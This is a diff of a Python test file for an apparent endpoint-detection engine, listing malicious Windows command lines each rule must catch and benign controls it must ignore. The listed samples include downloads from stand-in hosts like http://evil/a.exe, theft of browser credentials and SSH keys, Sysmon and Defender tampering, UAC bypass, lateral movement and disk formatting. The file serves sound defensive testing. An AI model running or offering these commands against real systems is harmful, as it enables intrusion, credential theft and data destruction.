@@ -3,7 +3,7 @@
 
 Every shipped rule must (1) fire on a representative malicious command shape,
 (2) map to a real ATT&CK technique the kill-chain correlator understands, and
-(3) NOT fire on a benign control. Broad coverage is the point — this is the
+(3) NOT fire on a benign control. Broad coverage is the point - this is the
 endpoint-detection breadth that separates a real EDR from a few heuristics.
 
   [1] Every rule fires on its own malicious example
@@ -29,7 +29,7 @@ def _check(label: str, ok: bool) -> None:
         _FAILURES.append(label)
 
 
-# (rule_id, image, parent, cmdline, path) — a representative TRUE positive each.
+# (rule_id, image, parent, cmdline, path) - a representative TRUE positive each.
 MALICIOUS = [
     ("office-spawns-shell", "powershell.exe", "winword.exe", "powershell -nop", ""),
     ("wmic-process-call", "wmic.exe", "cmd.exe", "wmic process call create calc.exe", ""),
@@ -161,7 +161,7 @@ MALICIOUS = [
     ("com-hijack", "reg.exe", "cmd.exe", "reg add HKCU\\Software\\Classes\\CLSID\\{guid}\\InprocServer32 /ve /d C:\\Users\\Public\\evil.dll /f", ""),
     ("netsh-portproxy", "netsh.exe", "cmd.exe", "netsh.exe interface portproxy add v4tov4 listenport=8080 connectport=445 connectaddress=10.0.0.5", ""),
     ("bits-persistence", "bitsadmin.exe", "cmd.exe", "bitsadmin.exe /SetNotifyCmdLine job C:\\Users\\Public\\evil.exe NULL", ""),
-    # Round-6 breadth — sensor self-defense, inhibit-recovery, staging,
+    # Round-6 breadth - sensor self-defense, inhibit-recovery, staging,
     # persistence, credential access, C2 tunnelling, ingress, LOLBins.
     ("service-delete-security", "sc.exe", "cmd.exe", "sc delete SysmonDrv", ""),
     ("fltmc-unload", "fltmc.exe", "cmd.exe", "fltmc unload SysmonDrv", ""),
@@ -171,6 +171,10 @@ MALICIOUS = [
     ("screensaver-hijack", "reg.exe", "cmd.exe", "reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /d C:\\evil.scr /f", ""),
     ("startup-folder-drop", "cmd.exe", "explorer.exe", "cmd /c copy evil.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\"", ""),
     ("browser-cred-theft", "cmd.exe", "cmd.exe", "cmd /c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\Users\\Public\\ld.db", ""),
+    # Collection - staging before exfil. Both key on the SOURCE being a
+    # credential/browser store, which is what keeps ordinary backups clear.
+    ("archive-credential-store", "rar.exe", "cmd.exe", "rar.exe a -r loot.rar C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data", ""),
+    ("copy-credential-store", "xcopy.exe", "cmd.exe", "xcopy.exe C:\\Users\\bob\\.ssh\\id_rsa C:\\temp\\ /Y", ""),
     ("cred-hunt-files", "findstr.exe", "cmd.exe", "findstr /si password *.txt *.ini *.config", ""),
     ("cmdkey-list", "cmdkey.exe", "cmd.exe", "cmdkey /list", ""),
     ("wifi-password-export", "netsh.exe", "cmd.exe", "netsh wlan export profile key=clear folder=C:\\Users\\Public", ""),
@@ -185,7 +189,7 @@ MALICIOUS = [
     ("infdefaultinstall-inf", "infdefaultinstall.exe", "cmd.exe", "InfDefaultInstall.exe C:\\Users\\Public\\evil.inf", ""),
     ("xwizard-runwizard", "xwizard.exe", "cmd.exe", "xwizard.exe RunWizard {clsid-guid}", ""),
     ("dnscmd-plugin-dll", "dnscmd.exe", "cmd.exe", "dnscmd.exe /config /serverlevelplugindll \\\\evil\\p.dll", ""),
-    # Round-7 breadth — env-var injection, boot tamper, log/audit evasion,
+    # Round-7 breadth - env-var injection, boot tamper, log/audit evasion,
     # account manipulation, service-reg persistence, lateral exec, capture.
     ("cor-profiler-hijack", "reg.exe", "cmd.exe", "reg add \"HKCU\\Environment\" /v COR_PROFILER /d {clsid} /f", ""),
     ("bcdedit-boot-tamper", "bcdedit.exe", "cmd.exe", "bcdedit /set testsigning on", ""),
@@ -197,21 +201,21 @@ MALICIOUS = [
     ("winrs-lateral", "winrs.exe", "cmd.exe", "winrs -r:dc01 cmd /c whoami", ""),
     ("netsh-trace-capture", "netsh.exe", "cmd.exe", "netsh trace start capture=yes tracefile=C:\\out.etl", ""),
     ("pktmon-capture", "pktmon.exe", "cmd.exe", "pktmon start --etw -f C:\\cap.etl", ""),
-    # Round-9 breadth — UAC-bypass registry hijack, Defender-as-LOLBin, hiding.
+    # Round-9 breadth - UAC-bypass registry hijack, Defender-as-LOLBin, hiding.
     ("uac-bypass-hijack", "reg.exe", "cmd.exe", "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd /c payload.exe\" /f", ""),
     ("mpcmdrun-download", "mpcmdrun.exe", "cmd.exe", "MpCmdRun.exe -DownloadFile -url http://evil/a.exe -path C:\\Users\\Public\\a.exe", ""),
     ("defender-signature-removal", "mpcmdrun.exe", "cmd.exe", "MpCmdRun.exe -RemoveDefinitions -All", ""),
     ("file-hide-attrib", "attrib.exe", "cmd.exe", "attrib +h +s C:\\Users\\Public\\evil.exe", ""),
     ("firewall-allow-payload", "netsh.exe", "cmd.exe", "netsh advfirewall firewall add rule name=backdoor dir=in action=allow program=\"C:\\Users\\Public\\evil.exe\"", ""),
     ("mofcomp-wmi-persistence", "mofcomp.exe", "cmd.exe", "mofcomp.exe C:\\Users\\Public\\evil.mof", ""),
-    # Round-11 breadth — registry telemetry-disable, ASEP-DLL, DCOM, history, wipe.
+    # Round-11 breadth - registry telemetry-disable, ASEP-DLL, DCOM, history, wipe.
     ("registry-telemetry-disable", "reg.exe", "cmd.exe", "reg add HKLM\\Software\\Microsoft\\Windows Script\\Settings /v AmsiEnable /t REG_DWORD /d 0 /f", ""),
     ("registry-asep-dll", "reg.exe", "cmd.exe", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\evil /v Driver /d evil.dll /f", ""),
     ("dcom-lateral", "powershell.exe", "cmd.exe", "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.0.0.5'))", ""),
     ("ps-history-creds", "powershell.exe", "cmd.exe", "Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", ""),
     ("format-volume", "format.com", "cmd.exe", "format D: /fs:ntfs /q /y", ""),
     ("mass-file-delete", "cmd.exe", "cmd.exe", "del /f /s /q C:\\Users\\bob\\Documents\\*.*", ""),
-    # Round-14 breadth — offensive tooling, SYSTEM shell, hidden staging, recovery.
+    # Round-14 breadth - offensive tooling, SYSTEM shell, hidden staging, recovery.
     ("offensive-cred-tooling", "powershell.exe", "cmd.exe", "Import-Module .\\SharpDPAPI; Invoke-SharpDPAPI -command masterkeys", ""),
     ("psexec-system", "psexec.exe", "cmd.exe", "psexec -s -i cmd.exe", ""),
     ("hidden-window-staging-exec", "powershell.exe", "cmd.exe", "Start-Process C:\\Users\\Public\\a.exe -WindowStyle Hidden", ""),
@@ -250,7 +254,7 @@ MALICIOUS = [
     ("rdrleakdiag-memory-dump", "rdrleakdiag.exe", "cmd.exe",
      "rdrleakdiag.exe /p 640 /o c:\\ /fullmemdmp /wait 1", ""),
     # Adaptive-hardening T1105 class: generic download cradle (renamed tool /
-    # novel method) — a HELD-OUT evader before the generalization.
+    # novel method) - a HELD-OUT evader before the generalization.
     ("remote-fetch-executable-generic", "cu.exe", "cmd.exe",
      "cu.exe -urlcache -f http://x/a.exe a.exe", ""),
     ("service-disable-registry-start", "reg.exe", "cmd.exe",
@@ -266,6 +270,26 @@ MALICIOUS = [
      "Add-Content $PROFILE 'Start-Process c:\\evil.exe'", ""),
     ("persistence-silent-process-exit", "reg.exe", "cmd.exe",
      "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d evil.exe /f", ""),
+
+    # Script hosts (T1059.005). Both found by Tier B 2026-08-25, where a bare
+    # `wscript.exe C:\Users\Public\evil.vbs` raised nothing at all.
+    ("scripthost-dropzone-script", "wscript.exe", "explorer.exe",
+     r"wscript.exe C:\Users\Public\evil.vbs", ""),
+    ("scripthost-from-document", "wscript.exe", "winword.exe",
+     r"wscript.exe C:\Users\v\AppData\Local\Temp\macro.vbs", ""),
+
+    # Signature-state rules. These carry a 6th element: the Authenticode state
+    # of the image, which the engine supplies from valkyrie/signature.py. They
+    # describe what the BINARY IS rather than what it did, which is why they
+    # generalise to payloads no rule was written for.
+    ("masquerade-unsigned-system-binary", "svchost.exe", "explorer.exe",
+     "svchost.exe", "c:\\users\\bob\\appdata\\local\\temp\\svchost.exe",
+     "unsigned"),
+    ("tampered-or-revoked-signature", "installer.exe", "explorer.exe",
+     "installer.exe /silent", "c:\\program files\\vendor\\installer.exe",
+     "untrusted"),
+    ("unsigned-binary-from-drop-zone", "payload.exe", "winword.exe",
+     "payload.exe", "c:\\users\\public\\payload.exe", "unsigned"),
 ]
 
 # Benign command shapes that must NEVER fire any rule.
@@ -305,7 +329,7 @@ BENIGN = [
     ("powershell.exe", "cmd.exe", "Get-Service -Name WinDefend", ""),   # security service, read-only
     ("robocopy.exe", "explorer.exe", "robocopy C:\\Data D:\\Backup /MIR", ""),   # local paths, no UNC
     ("cmd.exe", "explorer.exe", "copy \\\\fileserver\\shared\\report.docx .", ""),  # UNC to a NON-admin share
-    # rundll32 doing ordinary Windows work — DLLs from System32, which is where
+    # rundll32 doing ordinary Windows work - DLLs from System32, which is where
     # every legitimate rundll32 invocation loads from. These are extremely
     # common (Control Panel applets, printer UI, network dialogs) and are the
     # FP boundary for rundll32-lowtrust-dll.
@@ -313,7 +337,7 @@ BENIGN = [
      r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL", ""),
     ("rundll32.exe", "explorer.exe",
      r"rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /o", ""),
-    # An installer legitimately writing to ProgramData, but NOT via rundll32 —
+    # An installer legitimately writing to ProgramData, but NOT via rundll32 -
     # pins that the low-trust path list alone cannot fire without rundll32.
     ("setup.exe", "explorer.exe", r"setup.exe /S", r"C:\ProgramData\App\setup.exe"),
     # FP boundaries for the extended LOLBin rules (2026-08-12):
@@ -323,7 +347,7 @@ BENIGN = [
     ("esentutl.exe", "cmd.exe", "esentutl.exe /mh C:\\ProgramData\\App\\app.edb", ""),           # db header check, not NTDS/SAM/VSS
     ("forfiles.exe", "cmd.exe", "forfiles /p C:\\logs /m *.log /d -30", ""),                       # enumerate only, no /c command
     ("regasm.exe", "devenv.exe", "regasm.exe MyLib.dll /codebase", ""),                            # dev registration w/o /u or unpack path -> stays clear of /u
-    # Round-2 FP boundaries — read-only / legitimate siblings of the tamper rules:
+    # Round-2 FP boundaries - read-only / legitimate siblings of the tamper rules:
     ("wevtutil.exe", "cmd.exe", "wevtutil.exe qe Security /c:5 /rd:true /f:text", ""),              # query events, not sl /e:false
     ("powershell.exe", "cmd.exe", "Get-MpPreference | Select ExclusionPath", ""),                  # read AV config, not Add-MpPreference
     ("netsh.exe", "cmd.exe", "netsh.exe interface show interface", ""),                            # show, not add helper
@@ -342,7 +366,7 @@ BENIGN = [
     ("extrac32.exe", "cmd.exe", "extrac32.exe /Y drivers.cab", ""),                                 # cab extract, not /C copy
     ("wsl.exe", "explorer.exe", "wsl.exe --list --verbose", ""),                                    # list distros, not -e exec
     ("verclsid.exe", "explorer.exe", "verclsid.exe /S /C {CLSID}", ""),                             # Explorer's own COM-approval check
-    # Round-6 FP boundaries — close-but-legitimate siblings of the new rules:
+    # Round-6 FP boundaries - close-but-legitimate siblings of the new rules:
     ("sc.exe", "cmd.exe", "sc delete MyOldApp", ""),                                                # delete a NON-security service
     ("fltmc.exe", "cmd.exe", "fltmc filters", ""),                                                  # list filters, not unload
     ("sysmon64.exe", "cmd.exe", "sysmon64.exe -c", ""),                                             # dump config, not -u uninstall
@@ -411,8 +435,10 @@ def main() -> int:
     print(f"[1] Every rule ({len(RULES)}) fires on its malicious example")
     _check("a malicious example exists for every shipped rule",
            set(by_id) == mal_ids)
-    for rid, image, parent, cmd, path in MALICIOUS:
-        hits = {h.rule_id for h in match_process(image, parent, cmd, path)}
+    for entry in MALICIOUS:
+        rid, image, parent, cmd, path = entry[:5]
+        sig = entry[5] if len(entry) > 5 else ""
+        hits = {h.rule_id for h in match_process(image, parent, cmd, path, sig)}
         _check(f"{rid} fires", rid in hits)
 
     print("\n[2] Every rule's technique maps to a chain-ready tactic")
@@ -459,7 +485,7 @@ def main() -> int:
     from valkyrie.etw.wineventlog import parse_event_xml
     from valkyrie.etw.sysmon import classify_sysmon
     # Minimal but real Sysmon Operational EID1 shape (exactly what wevtapi
-    # renders): <System><EventID>1</EventID>…</System><EventData><Data Name=…>.
+    # renders): <System><EventID>1</EventID>...</System><EventData><Data Name=...>.
     # This guards the whole investigated path: a rule-matching command line
     # arriving as a genuine Sysmon process-create event must come out the far
     # end tagged with the right ATT&CK technique. A regression here (e.g. the
